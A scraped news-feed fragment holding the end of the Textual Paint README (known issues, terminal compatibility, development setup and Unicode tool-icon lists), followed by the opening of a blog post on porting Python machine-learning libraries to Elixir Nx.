<h2 tabindex="-1" dir="auto">Known Issues</h2>
<ul dir="auto">
<li>Undo/Redo doesn't work inside the Text tool's textbox. <kbd>Ctrl</kbd>+<kbd>Z</kbd> will delete the textbox. (Also note that the Text tool works differently from MS Paint; it will overwrite characters and the cursor can move freely, which makes it better for ASCII art, but worse for prose.)</li>
<li>The Text tool's cursor doesn't blink.</li>
<li>The selection box border appears inside instead of outside (and lacks dashes). For the text box, I hid the border because it was too visually confusing, but it should also have an outer border.</li>
<li>Pressing both mouse buttons stops the current tool, but doesn't undo the current action. Also Pick Color can't be cancelled (with <kbd>Esc</kbd> or by pressing both mouse buttons), since it samples the color continuously.</li>
<li>Due to limitations of the terminal, shortcuts using <kbd>Shift</kbd> or <kbd>Alt</kbd> might not work. Menus are not keyboard navigable, because I can't detect <kbd>Alt</kbd>+<kbd>F</kbd>, etc.</li>
<li>The Zoom submenu flickers as it opens, and may not always open in the right place.</li>
<li>The canvas flickers when zooming in with the Magnifier tool.</li>
<li>Some languages don't display correctly.</li>
<li>Large files can make the program very slow, as can magnifying the canvas. There is a 500 KB limit when opening files to prevent it from freezing.</li>
<li>Free-Form Select stamping/finalizing is incorrect when the selection is off-screen to the left or top.</li>
<li>The status bar description can be left blank when selecting a menu item. (I think the <code>Leave</code> event can come after closing, once the mouse moves.)</li>
<li>Menu items like Copy/Cut/Paste are not grayed out when inapplicable. Only unimplemented items are grayed out.</li>
<li>ANSI files (.ans) are treated as UTF-8 when saving and loading, rather than CP437 or Windows-1252 or any other encodings. Unicode is nice and modern terminals support it, but it's not the standard for ANSI files. There isn't really a standard for ANSI files.</li>
<li>ANSI files are loaded with a white background. This may make sense as a default for text files, but ANSI files either draw a background or assume a black background, being designed for terminals.</li>
<li>Hitting Enter in View Bitmap mode may trigger a menu item while exiting the mode. Menu items ought to be disabled when hidden, and View Bitmap should also prevent the key event from taking other actions if possible.</li>
<li>Airbrush is continuous in space instead of time. It should keep spraying while the mouse stays still.</li>
<li>Error messages may not show up when opening a file fails. I'm not sure how to reproduce this, so if you run into this, do let me know.</li>
<li>Edit Colors dialog
<ul dir="auto">
<li>Focus ring shows even while grid is not focused</li>
<li>Can show two cells as selected, instead of one across both grids</li>
<li>Custom colors order X/Y is different from MS Paint</li>
<li>Pressing enter in color grid should select color and close</li>
<li>Selection ring is hard to see in dark mode</li>
<li>Focus ring is invisible on a black color cell</li>
<li>When dragging on the color field or luminosity slider, the cursor can be seen to jump back to earlier places where the mouse was, before settling at the current position. (This may only be visible when the program is running slowly, such while debugging. I haven't observed this on the canvas, so maybe it has something to do with the dialog being on a separate layer.)</li>
<li>When opening the Edit Colors dialog, it may immediately close, if the mouse lines up with the "OK" or "Cancel" buttons. (This doesn't seem to currently happen, but I haven't knowingly fixed it. A git bisect turned up a bogus commit, possibly due to reproducing the behavior being unreliable. It also seems like it might depend on the specific layout of the dialog, which changed during development, and maybe even the terminal size.)</li>
</ul>
</li>
</ul>
<h2 tabindex="-1" dir="auto">Compatibility</h2>
<p dir="auto">Python 3.10 or later is required.</p>
<h3 tabindex="-1" dir="auto">Linux</h3>
<p dir="auto">Tested on Ubuntu 22, with GNOME Terminal, and VS Code's integrated terminal.</p>
<p dir="auto">GNOME Terminal works best, with crisp triangles used for icons in dialogs, emoji support, and true color support.</p>
<h3 tabindex="-1" dir="auto">macOS</h3>
<p dir="auto">Tested on OSX 10.14 (Mojave), with iTerm2, and VS Code's integrated terminal.</p>
<p dir="auto">In VS Code, Free-Form Select shows as tofu (a missing character symbol).</p>
<p dir="auto">The default Terminal has missing characters, causing misalignment of everything to the right of them, plus borders are not rendered nicely, giving it a sort of <em>frayed fabric</em> look, and it's limited to 256 colors.</p>
<h3 tabindex="-1" dir="auto">Windows</h3>
<p dir="auto">Textual Paint works with the new <a href="https://learn.microsoft.com/windows/terminal/install" rel="nofollow">Windows Terminal</a>.</p>
<h4 tabindex="-1" dir="auto">Pasting in Windows Terminal</h4>
<p dir="auto"><a href="https://github.com/microsoft/terminal/issues/11267" data-hovercard-type="issue" data-hovercard-url="/microsoft/terminal/issues/11267/hovercard"><kbd>Ctrl</kbd>+<kbd>V</kbd> does not work</a> to paste by default, but <strong>Edit &gt; Paste</strong> does work.
You can unbind <kbd>Ctrl</kbd>+<kbd>V</kbd> to fix this:</p>
<ul dir="auto">
<li>Open Windows Terminal's Settings (<kbd>Ctrl</kbd>+<kbd>,</kbd>)</li>
<li>Click "Open JSON file"</li>
<li>Disable the paste binding by adding <code>//</code> to the beginning of the lines:
<div dir="auto" data-snippet-clipboard-copy-content="// {
//     &quot;command&quot;: &quot;paste&quot;,
//     &quot;keys&quot;: &quot;ctrl+v&quot;
// },"><pre><span>// {</span>
<span>//     "command": "paste",</span>
<span>//     "keys": "ctrl+v"</span>
<span>// },</span></pre></div>
</li>
<li>Save the file, and the behavior should update immediately.</li>
</ul>
<p dir="auto">Alternatively, you can use the Actions tab of the Settings UI to remove the binding for <kbd>Ctrl</kbd>+<kbd>V</kbd>.</p>
<p dir="auto">If you're wondering why <em>removing</em> the Paste binding fixes it, it's because Textual Paint needs to receive the literal <kbd>Ctrl</kbd>+<kbd>V</kbd> key presses in order to trigger its own Paste command.</p>
<h4 tabindex="-1" dir="auto">Powershell Problems</h4>
<p dir="auto">Running in Powershell, you may run into a bug where the powershell prompt becomes active at the same time as the TUI.
Moving the mouse will redraw parts of the TUI, and it becomes hard to click on things, but still possible.
Commands can be entered, and the output will be interwoven with the TUI, including if you run a second instance of the program, in which case the two instances will vie for the screen.
If this happens, I would recommend first messing around with it, since it's a fun glitch, then opening a new tab in Windows Terminal with the <strong>Command Prompt profile</strong>, available in the new tab dropdown menu.</p>
<h4 tabindex="-1" dir="auto">Windows Console</h4>
<p dir="auto">Textual Paint will <strong>not</strong> work properly with the old Windows console (<code>conhost.exe</code>), which lacks emoji/Unicode support and true color support.
This program is commonly thought of as the "Command Prompt", but the Command Prompt (<code>cmd.exe</code>) is actually a <em>shell</em> (like <code>bash</code>) that can run in either the old console or the new Windows Terminal, which are both <em>terminal emulators</em>.</p>
<h3 tabindex="-1" dir="auto">VS Code</h3>
<p dir="auto">Note that VS Code's integrated terminal tries to fix the contrast of text, including in the canvas, which is entirely inappropriate for an ANSI art editor, as it obscures the colors, and can indeed <em>harm</em> the contrast of the resulting document, by tricking you into thinking there's more contrast than there actually is.</p>
<p dir="auto">To disable this, you can add this to your settings.json:</p>
<div dir="auto" data-snippet-clipboard-copy-content="&quot;terminal.integrated.minimumContrastRatio&quot;: 1"><pre><span>"terminal.integrated.minimumContrastRatio"</span>: <span>1</span></pre></div>
<p dir="auto">If this doesn't work, try increasing it to 1.1.</p>
<h2 tabindex="-1" dir="auto">Development</h2>
<p dir="auto">Recommended: first, create a virtual environment:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python -m venv .venv
# The activate script is in different places on different systems:
# Linux/macOS:
source .venv/bin/activate
# Windows:
.venv\Scripts\activate"><pre>python -m venv .venv
<span><span>#</span> The activate script is in different places on different systems:</span>
<span><span>#</span> Linux/macOS:</span>
<span>source</span> .venv/bin/activate
<span><span>#</span> Windows:</span>
.venv<span>\S</span>cripts<span>\a</span>ctivate</pre></div>
<p dir="auto">Install Textual and other dependencies:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install -r requirements.txt"><pre>pip install -r requirements.txt</pre></div>
<p dir="auto">Run the app via Textual's CLI for live-reloading CSS support, and enable other development features:</p>
<div dir="auto" data-snippet-clipboard-copy-content="textual run --dev &quot;src.textual_paint.paint --clear-screen --inspect-layout --restart-on-changes&quot;"><pre>textual run --dev <span><span>"</span>src.textual_paint.paint --clear-screen --inspect-layout --restart-on-changes<span>"</span></span></pre></div>
<p dir="auto">Or run more basically:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python -m src.textual_paint.paint"><pre>python -m src.textual_paint.paint</pre></div>
<p dir="auto">Or install the CLI globally*:</p>

<p dir="auto">Then run:</p>

<p dir="auto">*If you use a virtual environment, it will only install within that environment.</p>
<p dir="auto"><code>--clear-screen</code> is useful for development, because it's sometimes jarring or perplexing to see error messages that have actually been fixed, when exiting the program.</p>
<p dir="auto"><code>--inspect-layout</code> enables a DOM inspector accessible with F12, which I built. It also lets you apply a rainbow highlight and labels to all ancestors under the mouse with middle click, but this is mostly obsolete/redundant with the DOM inspector now. The labels affect the layout, so you can also hold Ctrl to only colorize, and you can remember how the colors correspond to the labels, to build a mental model of the layout.</p>
<p dir="auto"><code>--restart-on-changes</code> automatically restarts the program when any Python files change. This works by the program restarting itself directly. (Programs like <code>modd</code> or <code>nodemon</code> that run your program in a subprocess don't work well with a TUI's escape sequences.)</p>
<p dir="auto">There are also launch tasks configured for VS Code, so you can run the program from the Run and Debug panel.
Note that it runs slower in VS Code's debugger.</p>
<p dir="auto">To see logs, run <a href="https://textual.textualize.io/guide/devtools/#console" rel="nofollow"><code>textual console</code></a> and then run the program via <code>textual run --dev</code>.
This also makes it run slower.</p>
<p dir="auto">Often it's useful to exclude events with <code>textual console -x EVENT</code>.</p>
<details>
<summary>Testing file save/load roundtrip</summary>
<blockquote>
<p dir="auto">There are at this point lots of files that will change if you run this, so don't worry about it. Some are generated files, so they naturally change somewhat. The <code>0x0.ans</code> file saves as 1x1, due to the minimum size. <code>pathological_character_grid.svg</code> was free-handed with Inkscape, so naturally changes somewhat when re-saving. There may be actual problems, but they're hard to spot in the noise.</p>
</blockquote>
<p dir="auto">To test file encoding, run <code>textual run --dev "src.textual_paint.paint --recode-samples"</code>.</p>
<p dir="auto">If there are differences in the ANSI files, you can set up a special diff like this:</p>
<div dir="auto" data-snippet-clipboard-copy-content="git config --local &quot;diff.cat-show-all.textconv&quot; &quot;cat --show-all&quot;"><pre>git config --local <span><span>"</span>diff.cat-show-all.textconv<span>"</span></span> <span><span>"</span>cat --show-all<span>"</span></span></pre></div>
<p dir="auto">but you should check that <code>cat --show-all samples/2x2.ans</code> works on your system first.
Also, note that it might not work with your Git GUI of choice; you may need to use the command line.</p>
</details>
<h3 tabindex="-1" dir="auto">Troubleshooting</h3>
<blockquote>
<p dir="auto"><code>Unable to import 'app' from module 'src.textual_paint.paint'</code></p>
</blockquote>
<ul dir="auto">
<li>Make sure to activate the virtual environment, if you're using one.</li>
<li>Make sure to run the program from the root directory of the repository.</li>
</ul>
<blockquote>
<p dir="auto"><code>ModuleNotFoundError: No module named 'src'</code></p>
</blockquote>
<ul dir="auto">
<li>Make sure to run the program from the root directory of the repository.</li>
</ul>
<blockquote>
<p dir="auto"><code>ImportError: attempted relative import with no known parent package</code></p>
</blockquote>
<ul dir="auto">
<li><code>paint.py</code> can only be run as a module, not as a script. I just... I haven't had the heart to remove the shebang line.</li>
</ul>
<h3 tabindex="-1" dir="auto">Linting</h3>
<div dir="auto" data-snippet-clipboard-copy-content="# Spell checking
# I use the VS Code extension &quot;Code Spell Checker&quot;, and its associated CLI:
cspell-cli lint .

# Type checking
# I use the &quot;Python&quot; and &quot;Pylance&quot; VS Code extensions, and the Pyright CLI:
pyright  
# It should give 0 errors at this version of Pyright:
PYRIGHT_PYTHON_FORCE_VERSION=1.1.317 pyright
# It gives 508 errors with the next version (the current latest) for some reason:
PYRIGHT_PYTHON_FORCE_VERSION=1.1.318 pyright
# I also tried mypy and fixed some errors it reported, but I'm not targeting zero errors with mypy.
mypy src --no-namespace-packages --check-untyped-defs"><pre><span><span>#</span> Spell checking</span>
<span><span>#</span> I use the VS Code extension "Code Spell Checker", and its associated CLI:</span>
cspell-cli lint <span>.</span>

<span><span>#</span> Type checking</span>
<span><span>#</span> I use the "Python" and "Pylance" VS Code extensions, and the Pyright CLI:</span>
pyright  
<span><span>#</span> It should give 0 errors at this version of Pyright:</span>
PYRIGHT_PYTHON_FORCE_VERSION=1.1.317 pyright
<span><span>#</span> It gives 508 errors with the next version (the current latest) for some reason:</span>
PYRIGHT_PYTHON_FORCE_VERSION=1.1.318 pyright
<span><span>#</span> I also tried mypy and fixed some errors it reported, but I'm not targeting zero errors with mypy.</span>
mypy src --no-namespace-packages --check-untyped-defs</pre></div>
<h2 tabindex="-1" dir="auto">License</h2>
<p dir="auto"><a href="https://github.com/1j01/textual-paint/blob/main/LICENSE.txt">MIT</a></p>
<h2 tabindex="-1" dir="auto">Unicode Symbols and Emojis for Paint Tools</h2>
<p dir="auto">The first thing I did in this project was to collect possible characters to represent all the tool icons in MS Paint, to gauge how good of a recreation it would be possible to achieve, starting from looks.
As it turns out, I didn't run into any significant roadblocks, so I ended up recreating MS Paint. <a href="https://jspaint.app/" rel="nofollow">Again.</a></p>
<p dir="auto">These are the symbols I've found so far:</p>
<ul dir="auto">
<li>Free-Form Select:  ‚úÇÔ∏èüìêüÜìüï∏‚ú®‚öù‚õ§‚õ•‚õ¶‚õßü´•üá´/üá∏‚óå‚Åõ‚Åò ‚¢º‚†Æ</li>
<li>Select: ‚¨ö‚ñßüî≤ ‚£è‚£π ‚õ∂</li>
<li>Eraser/Color Eraser: üßºüßΩüßπüö´üëãüóëÔ∏è‚ñ∞‚ñ±</li>
<li>Fill With Color: <g-emoji alias="ocean" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f30a.png">üåä</g-emoji><g-emoji alias="sweat_drops" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a6.png">üí¶</g-emoji><g-emoji alias="droplet" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a7.png">üíß</g-emoji><g-emoji alias="rainbow" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f308.png">üåà</g-emoji><g-emoji alias="tada" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png">üéâ</g-emoji><g-emoji alias="confetti_ball" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f38a.png">üéä</g-emoji><g-emoji alias="bucket" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1faa3.png">ü™£</g-emoji>ü´ó</li>
<li>Pick Color: <g-emoji alias="art" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3a8.png">üé®</g-emoji><g-emoji alias="syringe" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f489.png">üíâ</g-emoji><g-emoji alias="nail_care" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f485.png">üíÖ</g-emoji><g-emoji alias="droplet" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a7.png">üíß</g-emoji><g-emoji alias="pushpin" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4cc.png">üìå</g-emoji><g-emoji alias="round_pushpin" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4cd.png">üìç</g-emoji>‚§§ùÄÉüùØ<g-emoji alias="sake" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f376.png">üç∂</g-emoji></li>
<li>Magnifier: üîçüîéüëÄüî¨üî≠üßêüïµÔ∏è‚Äç‚ôÇÔ∏èüïµÔ∏è‚Äç‚ôÄÔ∏è</li>
<li>Pencil: <g-emoji alias="pencil2" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/270f.png">‚úèÔ∏è</g-emoji>‚úé<g-emoji alias="writing_hand" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/270d.png">‚úçÔ∏è</g-emoji>üñé<g-emoji alias="pen" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f58a.png">üñäÔ∏è</g-emoji><g-emoji alias="fountain_pen" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f58b.png">üñãÔ∏è</g-emoji><g-emoji alias="black_nib" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2712.png">‚úíÔ∏è</g-emoji>üñÜ<g-emoji alias="memo" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4dd.png">üìù</g-emoji><g-emoji alias="crayon" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f58d.png">üñçÔ∏è</g-emoji></li>
<li>Brush: <g-emoji alias="paintbrush" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f58c.png">üñå</g-emoji><g-emoji alias="man_artist" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f468-1f3a8.png">üë®‚Äçüé®</g-emoji><g-emoji alias="artist" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f9d1-1f3a8.png">üßë‚Äçüé®</g-emoji><g-emoji alias="nail_care" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f485.png">üíÖ</g-emoji><g-emoji alias="broom" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f9f9.png">üßπ</g-emoji>ü™Æ<g-emoji alias="toothbrush" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1faa5.png">ü™•</g-emoji><g-emoji alias="razor" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1fa92.png">ü™í</g-emoji><g-emoji alias="plunger" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1faa0.png">ü™†</g-emoji>‚µÑ‚ëÉ·àê‚ãî‚ã≤ ‚ñ≠/ùà∏/‚äè/‚∏¶/‚äÇ+‚ãπ</li>
<li>Airbrush: ‚õ´<g-emoji alias="dash" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a8.png">üí®</g-emoji>–¥·ñú‚ïî<g-emoji alias="lotion_bottle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f9f4.png">üß¥</g-emoji><g-emoji alias="cup_with_straw" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f964.png">ü•§</g-emoji>ü´†</li>
<li>Text: <g-emoji alias="ab" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f18e.png">üÜé</g-emoji><g-emoji alias="memo" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4dd.png">üìù</g-emoji><g-emoji alias="page_facing_up" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c4.png">üìÑ</g-emoji><g-emoji alias="page_with_curl" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c3.png">üìÉ</g-emoji><g-emoji alias="abc" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f524.png">üî§</g-emoji><g-emoji alias="scroll" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4dc.png">üìú</g-emoji>AÔº°</li>
<li>Line: <g-emoji alias="straight_ruler" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4cf.png">üìè</g-emoji><g-emoji alias="chart_with_downwards_trend" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c9.png">üìâ</g-emoji><g-emoji alias="chart_with_upwards_trend" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c8.png">üìà</g-emoji>‚üçùàè‚ï≤‚ßπ\‚ßµ‚àñ</li>
<li>Curve: <g-emoji alias="arrow_right_hook" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/21aa.png">‚Ü™Ô∏è</g-emoji><g-emoji alias="hook" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1fa9d.png">ü™ù</g-emoji><g-emoji alias="crescent_moon" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f319.png">üåô</g-emoji><g-emoji alias="wavy_dash" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/3030.png">„Ä∞Ô∏è</g-emoji>‚ó°‚ó†~‚àº‚âà‚àΩ‚àø„Äú„Ä∞ÔπãÔπè‚âà‚âãÔΩû‚Åì</li>
<li>Rectangle: ‚ñ≠‚ñ¨‚ñÆ‚ñØ<g-emoji alias="red_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e5.png">üü•</g-emoji><g-emoji alias="orange_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e7.png">üüß</g-emoji><g-emoji alias="yellow_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e8.png">üü®</g-emoji><g-emoji alias="green_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e9.png">üü©</g-emoji><g-emoji alias="blue_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e6.png">üü¶</g-emoji><g-emoji alias="purple_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7ea.png">üü™</g-emoji><g-emoji alias="brown_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7eb.png">üü´</g-emoji><g-emoji alias="black_large_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b1b.png">‚¨õ</g-emoji><g-emoji alias="white_large_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b1c.png">‚¨ú</g-emoji><g-emoji alias="black_medium_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/25fc.png">‚óºÔ∏è</g-emoji><g-emoji alias="white_medium_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/25fb.png">‚óªÔ∏è</g-emoji><g-emoji alias="black_medium_small_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/25fe.png">‚óæ</g-emoji><g-emoji alias="white_medium_small_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/25fd.png">‚óΩ</g-emoji><g-emoji alias="black_small_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/25aa.png">‚ñ™Ô∏è</g-emoji><g-emoji alias="white_small_square" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/25ab.png">‚ñ´Ô∏è</g-emoji></li>
<li>Polygon: ‚ñôùóüùôáÔπÑ„Äèìäã‚¨£‚¨ü<g-emoji alias="large_orange_diamond" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f536.png">üî∂</g-emoji><g-emoji alias="large_blue_diamond" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f537.png">üî∑</g-emoji><g-emoji alias="small_orange_diamond" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f538.png">üî∏</g-emoji><g-emoji alias="small_blue_diamond" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f539.png">üîπ</g-emoji><g-emoji alias="small_red_triangle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f53a.png">üî∫</g-emoji><g-emoji alias="small_red_triangle_down" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f53b.png">üîª</g-emoji>‚ñ≥‚ñ≤</li>
<li>Ellipse: ‚¨≠<g-emoji alias="o" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b55.png">‚≠ï</g-emoji><g-emoji alias="red_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f534.png">üî¥</g-emoji><g-emoji alias="orange_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e0.png">üü†</g-emoji><g-emoji alias="yellow_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e1.png">üü°</g-emoji><g-emoji alias="green_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e2.png">üü¢</g-emoji><g-emoji alias="large_blue_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f535.png">üîµ</g-emoji><g-emoji alias="purple_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e3.png">üü£</g-emoji><g-emoji alias="brown_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f7e4.png">üü§</g-emoji><g-emoji alias="black_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26ab.png">‚ö´</g-emoji><g-emoji alias="white_circle" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26aa.png">‚ö™</g-emoji>ü´ß</li>
<li>Rounded Rectangle: ‚ñ¢‚¨ú‚¨õ</li>
</ul>
<p dir="auto">The default symbols used may not be the best on your particular system, so I may add some kind of configuration for this in the future.</p>
<h3 tabindex="-1" dir="auto">Cursor</h3>
<p dir="auto">A crosshair cursor could use one of <code>+‚úú‚úõ‚äπ‚úö‚ïã‚ï¨‚Åò‚Åõ‚åñ‚Øê</code>, but whilst that imitates the look, it might be better to show the pixel under the cursor, i.e. character cell, surrounded by dashes, like this:</p>

<h2 tabindex="-1" dir="auto">See Also</h2>
<ul dir="auto">
<li><a href="http://jave.de/" rel="nofollow">JavE</a>, an advanced Java-based ASCII art editor</li>
<li><a href="http://vectorpoem.com/playscii/" rel="nofollow">Playscii</a>, a beautiful ASCII/ANSI art editor. This is also written in Python and MIT licensed, so I might take some code from it, for converting images to ANSI, for example. Who knows, maybe I could even try to support its file format.</li>
<li><a href="https://github.com/knosmos/cmdpxl">cmdpxl</a>, a pixel art editor for the terminal using the keyboard</li>
<li><a href="https://github.com/douglascdev/pypixelart">pypixelart</a>, a pixel art editor using vim-like keybindings, inspired by cmdpxl but not terminal-based</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[From Python to Elixir Machine Learning (248 pts)]]></title>
            <link>https://www.thestackcanary.com/from-python-pytorch-to-elixir-nx/</link>
            <guid>36859785</guid>
            <pubDate>Tue, 25 Jul 2023 09:04:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thestackcanary.com/from-python-pytorch-to-elixir-nx/">https://www.thestackcanary.com/from-python-pytorch-to-elixir-nx/</a>, See on <a href="https://news.ycombinator.com/item?id=36859785">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>As Elixir's Machine Learning (ML) ecosystem grows, many Elixir enthusiasts who wish to adopt the new machine learning libraries in their projects are stuck at a crossroads of wanting to move away from their existing ML stack (typically Python) while not having a clear path of how to do so. I would like to take some time to talk to WHY I believe now is a good time to start porting over Machine Learning code into Elixir, and HOW I went about doing just this for two libraries I wrote: <a href="https://github.com/acalejos/exgboost?ref=thestackcanary.com">EXGBoost</a> (from Python XGBoost) and <a href="https://github.com/acalejos/mockingjay?ref=thestackcanary.com">Mockingjay</a> (from Python Hummingbird).</p>
<h2 id="why-is-python-not-sufficient">Why is Python not Sufficient?</h2>
<p>There's a common saying in programming languages that no language is perfect, but that different languages are suited for different jobs. Languages such as C, Rust, and now even Zig are known for their targeting systems development, while languages such as C++, C#, and Java are more commonly used for application development, and obviously there are the web languages such as JavaScript/TypeScript, PHP, Ruby (on Rails), and more. There are gradations to these rules of course, but more often than not there are good reasons that languages tend to exist within the confines of particular use cases. </p>
<p> Languages such as Elixir and Go tend to be used in large distributed systems because they place an emphasis on having great support for common concurrency patterns, which can come at the cost of supporting other domains. Go, for example, has barely (if any?) support for machine learning libraries, but it's also not trying to cater to that as a target domain. For a long time,e the same could have been said about Elixir, but over the past two or so years, there has been a massive concerted push from the Elixir community to not only have support for machine learning, but to push the envelope with the maintaining state of the art libraries that are beginning to compete with the other dominant machine learning languages - namely Python. </p>
<p>Python has long been the gold standard in the realm of machine learning. The breadth of libraries and the low entry barrier makes Python a great language to work with, but it does create a bit of a bottleneck. Any application that wishes to integrate machine learning has historically had only a couple of options: have a Python component or reach into the underlying libraries that power much of the Python libraries directly. Despite all the good parts of Python I mentioned before, speed and support for concurrency are not on that list. Elixir-Nx is striving to give another option - an option that can take advantage of the native distributed support that Elixir and the BEAM VM have to offer. Nx's <code>Nx.Serving</code> construct is a drop-in solution for serving distributed machine-learning models. </p>
<h2 id="how-to-proceed">How to Proceed</h2>
<p>Sean Moriarity, the co-creator of Nx, creator of Axon, and author of <a href="https://pragprog.com/titles/smelixir/machine-learning-in-elixir/?ref=thestackcanary.com">Machine Learning in Elixir</a>, has talked many times about how the initial creation of Nx and Axon involved hours upon hours of reading source code from reference implementations of libraries in Python and C++, namely the Tensorflow source code. While I was writing <a href="https://github.com/acalejos/exgboost?ref=thestackcanary.com">EXGBoost</a> and <a href="https://github.com/acalejos/mockingjay?ref=thestackcanary.com">Mockingjay</a>, much of my time, especially towards the beginning, was spent referencing the Python and C++ implementations of the original libraries.  This builds a great fundamental understanding of the libraries as well as taught me how to identify patterns in Python and C++ and identify the Elixir pattern that could express the same ideas. This skill is invaluable, and the better I got at it the faster I could write. Below is a summary and key takeaways from my process of porting Python / PyTorch to Elixir / Nx. </p>
<h2 id="workflow-overview">Workflow Overview</h2>
<p>Before I get to the examples from the code bases, I would like to briefly explain the high-level cyclical workflow I established while working on this effort, and what I would recommend to anyone pursuing a similar endeavor. </p>
<h3 id="understand-the-macro-system">Understand the Macro System</h3>
<p> Much like how there's a common strategy to reading comprehension which involves reading through the entire document once to get a high-level understanding and then doing subsequent shorter reads to gain more in-depth understanding with the added context of the entire piece, you can consider doing the same when reading code. My first step was to follow the logical flow from the call of <code>hummingbird.ml.convert</code> to the final result. You can use tools such as function tracers and callgraph generators to accelerate this part of the process, or manually trace depending on the extent of the codebase. I felt in my case that it was manageable to trace myself. </p>
<h3 id="read-the-documentation">Read the Documentation</h3>
<p>Once you have a general understanding of the flow and process of the original system, you can start referring to the documentation for some additional context. In my case, this lead me to the academic paper <a href="https://scnakandala.github.io/papers/TR_2020_Hummingbird.pdf?ref=thestackcanary.com"><em>Taming Model Serving Complexity, Performance and Cost: A Compilation to Tensor Computations Approach</em></a><em>, </em>which was the underlying ground work and basis for their implementation. I could write a whole other blog post about the process of transcribing algorithms and code from academic papers and pseudocode, but for now just know that these are some of the most important pieces you can refer to while re-implementing or porting over a piece of source code. </p>
<h3 id="read-the-source-code-in-detail">Read the Source Code in Detail</h3>
<p>This is the point in which you want to disambiguate the higher-level ideas from the first step and really gain a fine, high-resolution understanding of what is happening. There might even be some points in which you need to deconflict the source code with its documentation and/or paper reference. In those cases, the source code almost always wins, and if not, then you likely have a bug report you can file. If you see things you don't fully understand, you don't necessarily need to address it here, but you should make note of it and keep it in mind while working in case new details help resolve it. </p>
<h3 id="implement-the-new-code">Implement the New Code</h3>
